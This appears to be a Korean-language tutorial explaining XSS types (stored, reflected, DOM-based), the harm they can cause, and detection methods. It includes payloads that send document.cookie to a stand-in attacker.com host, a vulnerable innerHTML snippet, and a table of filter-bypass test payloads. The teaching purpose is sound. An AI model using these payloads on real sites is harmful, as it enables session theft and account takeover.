# XSS (Cross-Site Scripting)

## 1. What is XSS (Cross-Site Scripting)?

웹사이트는 보통 서버에서 "이 페이지를 이렇게 보여줘"라는 내용(HTML)을 받아서, 브라우저가 화면에 그려줍니다.\
그런데 어떤 웹사이트는 사용자가 입력한 내용(댓글,검색어, 닉네임 등)을 `제대로 확인하지 않고` 그대로 페이지에 넣어버립니다.\
이때 나쁜 사람이 댓글에 적는다고 생각해볼때 : 
```
반갑습니다.

<script>alert(Hello)</script>
<script>Malicious Code</script>
```
이 댓글이 그대로 저장되거나 화면에 표시되면, 나중에 다른 사람이 페이지를 열었을 때 **브라우저가 코드를 진짜 프로그램처럼 실행**해버립니다.\
즉,\
**사용자가 적은 글을 그대로 화면에 보여주다 보니, 그 안에 숨어 있던 나쁜 자바스크립트 코드가 실행되는 것**이 XSS입니다.

**쉽게 비유하면**
- **정상적인 웹사이트** = 식당에서 손님이 주문한 음식을 그대로 가져다주는 것
- **XSS가 있는 웹사이트** = 손님이 주문지에 "이 음식에 독약을 넣어주세요"라고 적었는데, 주방장이 확인도 안 하고 그대로 만들어 다른 손님에게 주는 것

**핵심**
- XSS는 내 컴퓨터나 서버를 직접 해킹하는 게 아님
- 웹사이트가 사용자가 입력한 내용을 그대로 보여주다 보니, 그 안에 숨은 나쁜 코드가 다른 사람 브라우저에서 실행됨
- 서버 자체를 망가뜨리지는 못하지만, 사용자를 속여서 피해를 줄 수 있기 때문에 위험한 취약점
- 이러한 문제가 웹사이트에서 꽤 자주 발견되기 때문에, 보안에서는 "중간 정도 위험"으로 보고 꼭 찾아서 고쳐야 함

---

## 2. XSS를 통해 가능한 공격들

XSS가 되면 공격자는 **그 사람이 보고 있는 웹사이트 안에서** 마음대로 JavaScript 코드를 실행할 수 있습니다.\
그래서 단순히 "알림창이 뜬다" 정도가 아니라, 꽤 다양한 나쁜 일을 할 수 있습니다.

**실제로 할 수 있는 일들**
- **로그인 정보 훔치기** : 피해자가 로그인된 상태라면, 그 사람의 로그인 세션(쿠키)을 공격자 쪽으로 몰래 보낼 수 있습니다. 그러면 공격자가 그 사람인 척 로그인 가능.
- **그 사람 대신 행동하기** : 피해자의 권한으로 비밀번호를 바꾸거나, 이메일을 바꾸거나, 설정을 변경하는 등의 행동을 할 수 있음.
- **가짜 화면 보여주기** : "비밀번호를 다시 입력하세요" 같은 가짜 창을 띄워서 정보를 입력하게 만듬.
- **키보드 입력 훔치기** : 브라우저 안에서 사용자가 타이핑하는 내용을 몰래 기록 가능.
- **이상한 광고 띄우기** : 페이지에 원하지 않는 광고를 강제로 보여줌.
- **컴퓨터 자원 몰래 사용하기** : 예를 들어 암호화폐 채굴처럼, 사용자의 브라우저를 이용해서 몰래 계산을 시킬 수 있음.

쉽게 말해,
**그 웹사이트를 보고 있는 사람의 브라우저를 잠깐 조종할 수 있다**고 생각하면 됩니다.

**XSS로 못 하는 것 (한계)**
- XSS는 **브라우저 안에서만** 동작.
- 컴퓨터 자체를 해킹해서 파일을 지우거나, 프로그램을 설치하는 것 같은 **시스템 전체를 장악하는 일**은 기본적으로 불가능.

**그런데도 위험한 이유**
브라우저 안에서만 실행된다고 해도, 
로그인 정보를 훔치거나 그 사람인 척 행동을 할 수 있기 때문에 **실제 피해는 충분히 클 수 있습니다.**

## 3. XSS의 주요 유형

- **Stored XSS (Persistent)** : 사용자 입력이 백엔드 데이터베이스에 저장된 후, 나중에 페이지를 볼 때 실행됨 (예: 게시글, 댓글). 한 번 저장되면 여러 사용자에게 지속적으로 영향. 위험도 가장 높음.
- **Reflected XSS (Non-Persistent)** : 사용자 입력이 서버에서 처리된 후 즉시 응답에 반영되어 실행 됨 (예: 검색 결과, 에러 메시지). 저장되지 않음. 보통 악성 링크를 클릭해야 실행됨. 위험도 중간.
- **DOM-based (Document Object Model) XSS** : 사용자 입력이 서버를 거치지 않고 클라이언트 측 JavaScript에서 직접 처리되어 실행됨 (예: URL fragment, document.location 등). 서버 로그에 남지 않는 경우가 많음. 위험도 상황에 따라 다름.

**유형별 간단 정리**
- **Stored XSS** : 서버에 저장 -> 다른 사용자가 페이지를 열 때 자동 실행. 관리자 페이지에 삽입되면 특히 위험.
- **Reflected XSS** : 요청 -> 즉시 응답에 반영. 주로 피싱 링크와 결합되어 사용.
- **DOM-based XSS** : 순수하게 브라우저 안에서 발생. 서버 측 검증을 우회할 수 있음.

## 3.1 Stored XSS (Persistent)

**특징**
- 공격자가 입력한 악성 JavaScript 코드가 **서버(DB)에 저장됨**.
- 이후 다른 사용자가 해당 페이지를 열면, 저장된 코드가 자동으로 실행됨.
- 한 번 저장되면 **지속적으로** 피해를 줄 수 있어서 **Persistent XSS**라고 불림.
- 대표적인 발생 위치 : 댓글, 게시글, 프로필 소개, 사용자 이름, 리뷰, 쪽지 등.

**예시 시나리오**
1. 공격자가 웹사이트 게시판에 댓글을 작성.
2. 댓글 내용에 악성 코드를 넣음. 예 : `<script>alert(document.cookie)</script>, <script>document.location='https://attacker.com/steal?c='+document.cookie</script>`
3. 이 댓글이 서버에 그대로 저장됨.
4. 나중에 다른 사용자(또는 관리자)가 그 게시글을 열면, 브라우저가 저장된 악성 코드를 실행.
5. 피해자의 세션 쿠키가 공격자 서버로 전송되거나, 피해자 권한으로 특정 행동이 수행됨.

**Reflected XSS보다 위험한 이유**
| 구분     | Stored XSS                | Reflected XSS    |
| ------ | ------------------------- | ---------------- |
| 저장 여부  | 서버에 저장됨                   | 저장되지 않음          |
| 공격 방식  | 한 번 심어두면 계속 실행            | 매번 악성 링크를 클릭해야 함 |
| 피해자 유도 | 거의 필요 없음 (페이지 방문만으로 실행)   | 피해자가 링크를 클릭해야 함  |
| 영향 범위  | 여러 사용자에게 동시 영향 가능         | 보통 한 명씩 공격       |
| 관리자 대상 | 관리자 페이지에 심어두면 높은 권한 탈취 가능 | 상대적으로 어려움        |

**요약**
- Stored XSS는 악성 코드를 **한 번만 저장**해두면, 이후 페이지를 방문하는 사람들이 **자동으로** 공격에 노출됩니다.
- 특히 관리자나 다른 사용자가 자주 보는 곳에 삽입되면 피해가 커지기 때문에, 일반적으로 Reflected XSS보다 더 위험하다고 평가 됨.

---

## 3.2 Reflected XSS (Non-Persistent)

**특징**
- 공격자가 만든 **악성 링크**를 피해자가 클릭했을 때 발생함.
- 악성 코드가 서버에 저장되지 않고, **요청에 포함되어 잇다가 응답에 그대로 반사 (Reflected)** 되어 실행 됨.
- 그래서 **Non-Persistent XSS**라고 불림.
- 주로 검색창, 에러 메시지, 로그인 실패 메시지 등에서 발생함.
- 피해자를 속여서 링크를 클릭하게 만들어야 공격이 성공함.

**예시 시나리오**
1. 어떤 웹사이트에 검색 기능이 있음. 예 : `https://example.com/search?q=검색어`
2. 공격자가 다음과 같은 악성 링크를 만듬. 예 : `https://example.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>`
3. 이 링크를 이메일, 메시지, SNS 등으로 피해자에게 보냄. 예 : "할인 쿠폰", "이거 보세요"
4. 피해자가 링크를 클릭하면, 웹사이트가 검색어를 그대로 페이지에 출력함.
5. 브라우저는 출력된 내용을 실행하면서 악성 스크립트가 동작하고, 피해자의 세션 쿠키가 공격자 서버로 전송됨.

**요약**
- Reflected XSS는 **악성 코드가 담긴 링크를 클릭해야만 실행되는 XSS**.
- 서버에 저장되지 않기 때문에, 피해자를 직접 유도해야 한다는 점이 Stored XSS와의 가장 큰 차이.

---

## 3.3 DOM-based XSS

**특징**
- 악성 코드가 **서버를 전혀 거치지 않고**, 브라우저 안에서만 실행됨.
- 페이지의 JavaScript가 사용자 입력값(주로 URL)을 읽어서 **DOM을 직접 수정**하는 과정에서 발생함.
- 서버는 이 악성 값을 받지도, 저장하지도 않기 때문에 **서버 로그에 남지 않는 경우**가 많음.
- 주로 URL의 fragment(`#` 뒤 부분)나 클라이언트 측에서 처리하는 파라미터에서 발생함.

**예시 시나리오**
1. 어떤 웹사이트에 아래와 같은 JavaScript가 있음.
   ```
   var name = location.hash.substring(1);  // URL의 # 뒤를 가져옴
   document.getElementById("welcome").innerHTML = "안녕하세요, " + name;
   ```
2. 공격자가 다음과 같은 링크를 만듬. 예 : `https://example.com/page.html#<img src=x onerror=alert(document.cookie)>`
3. 피해자가 이 링크를 클릭함.
4. 서버는 `#`뒤의 내용을 받지 않음. 하지만 브라우저의 JavaScript가 `location.hash` 값을 읽어서 그대로 페이지에 넣음.
5. 그 결과 악성코드가 실행 됨.

**위험도 높음**
- **로그인된 상태에서 실행될 때** : 피해자가 이미 로그인된 페이지에서 DOM XSS가 터지면, 세션 쿠키를 탈취하거나 그 사람 대신 행동 가능. Stored XSS와 비슷한 수준으로 위험.
- **민감한 기능을 가진 페이지일 때** : 비밀번호 변경 페이지, 개인정보 수정 페이지, 결제 피이지, 관리자 기능이 있는 페이지 등등.
- **다른 사용자에게 영향을 줄 수 있을 때** : URL을 공유하거나, 링크로 유도하기 쉬운 페이지. Reflcted XSS처럼 피해자를 유도해서 공격 가능.

**위험도 낮음**
- 로그인하지 않은 공개 페이지에서만 발생하고, 민감한 기능이 없을 때.
- 단순히 화면에 뭔가 표시만 되고, 쿠키나 중요 데이터에 접근하지 못할 때.
- 피해자를 특정 링크를 클릭하게 만들어야만 공격이 가능한데, 그 유도가 어려운 경우.

**Sotred / Reflected 와의 차이**
| 구분        | DOM-based XSS  | Reflected XSS | Stored XSS |
| --------- | -------------- | ------------- | ---------- |
| 서버 경유     | 안 함            | 함             | 함          |
| 저장 여부     | 저장 안 됨         | 저장 안 됨        | 저장됨        |
| 로그에 남는 경우 | 거의 없음          | 남음            | 남음         |
| 실행 조건     | 링크 클릭 또는 특정 동작 | 링크 클릭         | 페이지 방문     |

**요약**
- DOM-based XSS는 **서버는 아무것도 모르는 상태에서, 브라우저 안의 JavaScript가 사용자 입력값을 잘못 처리해서 발생하는 XSS**임.

# 4. 탐지 방법

XSS는 **사용자 입력이 페이지에 풀력되는 모든 곳에서** 발생할 수 있음.

아래 위치들을 우선적으로 확인 : 
- URL 파라미터 : `?q=`, `?search=`, `?id`, `?name=` 등.
- POST 데이터 : 로그인 폼, 댓글 작성, 검색 폼, 프로필 수정 등.
- HTTP 헤더 : `User-Agent`, `Referer`, `X-Forwarded-For` 등 (일부 사이트에서 출력하는 경우).
- 쿠키 : 쿠키 값이 페이지에 표시되는 경우.
- 파일명 : 파일 업로드 후 파일명이 페이지에 출력되는 경우.
- 기타 : 에러 메시지, JSON 응답이 HTML에 포함되는 경우 등.

팁 : 페이지에서 내가 입력한 값이 그대로 보이는 곳을 찾는 것이 가장 중요.

**기본 테스트 페이로드**\
처음에는 복잡한 코드 대신, **입력이 그대로 출력되는지** 확인하는 간단한 값을 넣음.

| 목적         | 테스트 값                        | 설명              |
| ---------- | ---------------------------- | --------------- |
| 기본 확인      | <test> 또는 xss test           | 그대로 출력되는지 확인    |
| 스크립트 실행 확인 | <script>alert(1)</script>    | 가장 기본적인 테스트     |
| 태그 닫기 테스트  | "><script>alert(1)</script>  | 속성 안에서 탈출 시도    |
| 이벤트 핸들러    | <img src=x onerror=alert(1)> | script 태그가 막힐 때 |
| SVG 활용     | <svg onload=alert(1)>        | 다른 태그로 우회       |

주의 : 응답에 값이 보인다고 해서 무조건 취약한 것은 아님. **브라우저에서 실제로 스크립트가 실행되는지**까지 확인해야 함.
